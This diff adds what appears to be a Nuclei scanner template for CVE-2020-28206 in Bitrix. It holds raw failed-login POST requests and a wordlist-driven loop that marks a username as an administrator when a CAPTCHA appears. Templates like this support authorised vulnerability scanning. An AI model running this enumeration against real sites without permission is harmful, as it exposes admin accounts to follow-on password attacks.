@@ -1,0 +1,131 @@
+id: bitrix-admin-enumeration-captcha
+
+info:
+  name: Bitrix Admin Enumeration via CAPTCHA (CVE-2020-28206)
+  author: krolchonok
+  severity: medium
+  description: |
+    Admin login form shows CAPTCHA after failed logins only for users in the
+    administrators group. First calibrates with a random login (must NOT get
+    CAPTCHA); then wordlist — CAPTCHA means admin-group user exists.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-28206
+    - https://justrealstag.medium.com/user-enumeration-improper-restriction-of-excessive-authentication-attempts-in-bitrix-98933a97e0e6
+  classification:
+    cve-id: CVE-2020-28206
+    cwe-id: CWE-307
+  metadata:
+    max-request: 1200
+  tags: bitrix,bitrix24,enum,captcha,cve,cve2020
+
+variables:
+  bogus_user: "{{to_lower(rand_text_alpha(16))}}_no_such_user"
+
+flow: http(1) && http(2)
+
+http:
+  # Same bogus login x4 — CAPTCHA must NOT appear (else IP already throttled / technique broken)
+  - raw:
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{bogus_user}}&USER_PASSWORD=not_valid_pass&Login=&captcha_sid=&captcha_word=&sessid=
+
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{bogus_user}}&USER_PASSWORD=not_valid_pass&Login=&captcha_sid=&captcha_word=&sessid=
+
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{bogus_user}}&USER_PASSWORD=not_valid_pass&Login=&captcha_sid=&captcha_word=&sessid=
+
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{bogus_user}}&USER_PASSWORD=not_valid_pass&Login=&captcha_sid=&captcha_word=&sessid=
+
+    cookie-reuse: true
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CAPTCHA_CODE"
+          - "name=\"captcha_word\""
+          - "name=\"captcha_sid\""
+        condition: or
+        negative: true
+        internal: true
+
+  # Same username x4 failed logins — CAPTCHA => admin
+  - raw:
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{username}}&USER_PASSWORD=not_valid_pass_{{randstr}}&Login=&captcha_sid=&captcha_word=&sessid=
+
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{username}}&USER_PASSWORD=not_valid_pass_{{randstr}}&Login=&captcha_sid=&captcha_word=&sessid=
+
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{username}}&USER_PASSWORD=not_valid_pass_{{randstr}}&Login=&captcha_sid=&captcha_word=&sessid=
+
+      - |
+        POST /bitrix/admin/index.php?login=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN={{username}}&USER_PASSWORD=not_valid_pass_{{randstr}}&Login=&captcha_sid=&captcha_word=&sessid=
+
+    cookie-reuse: true
+    payloads:
+      username: wordlists/unix_users.txt
+    attack: batteringram
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CAPTCHA_CODE"
+          - "name=\"captcha_word\""
+          - "name=\"captcha_sid\""
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"admin_login: " + username'
